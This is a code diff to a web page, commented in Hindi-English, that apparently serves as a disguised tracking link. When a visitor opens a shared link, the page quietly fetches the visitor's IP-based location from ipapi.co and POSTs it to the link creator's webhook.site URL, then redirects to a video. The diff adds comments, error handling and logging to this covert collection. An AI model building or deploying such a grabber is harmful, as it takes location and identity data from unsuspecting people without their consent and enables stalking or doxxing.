@@ -311,6 +311,7 @@
         // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
         const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein!
 
+        // --- UI Control Functions ---
         function showSection(id, btn) {
             document.querySelectorAll('.container, .admin-section').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
@@ -322,7 +323,10 @@
         }
 
         function openWebhookDashboard() {
-            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL")) { alert("Pehle apna Webhook URL code mein daalein!"); return; }
+            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
+                alert("Warning: Aapne apna Webhook URL set nahi kiya hai. Kripya code mein 'YOUR_WEBHOOK_URL_HERE' ko apne Webhook.site URL se badlein.");
+                return;
+            }
             const dashboardUrl = WEBHOOK_URL.replace('https://webhook.site/', 'https://webhook.site/#!/');
             window.open(dashboardUrl, '_blank');
         }
@@ -373,6 +377,7 @@
         // --- Tracking Logic ---
         window.onload = function () {
             const urlParams = new URLSearchParams(window.location.search);
+            // dataEncoded parameter mein saari link ki information hoti hai (video URL, name, message)
             const dataEncoded = urlParams.get('data');
 
             if (dataEncoded) {
@@ -388,6 +393,7 @@
 
                     const targetUrl = config.u;
 
+                    // Pehle IP-based location data fetch karein
                     fetch('https://ipapi.co/json/')
                         .then(response => response.json())
                         .then(data => {
@@ -406,16 +412,22 @@
 
                             saveLogLocally(visitorData);
 
-                            if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL")) {
+                            // Agar Webhook URL set hai, toh data wahan bhej dein
+                            if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
+                                console.log("Sending data to Webhook:", visitorData); // Console mein dikhayega kya bhej rahe hain
                                 return fetch(WEBHOOK_URL, {
                                     method: 'POST',
-                                    mode: 'no-cors',
+                                    mode: 'no-cors', // Cross-origin request ke liye, response access nahi kar sakte, but request send hogi
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify(visitorData)
-                                });
+                                })
+                                    .catch(webhookErr => { // Webhook fetch ke network errors catch karein
+                                        console.error("Webhook send error (check network or URL):", webhookErr);
+                                    });
                             }
                         })
-                        .catch(err => console.error("Tracking Error:", err))
+                        // ipapi.co fetch ke errors catch karein
+                        .catch(ipApiErr => console.error("IP API fetch error:", ipApiErr))
                         .finally(() => {
                             setTimeout(() => {
                                 window.location.href = targetUrl;
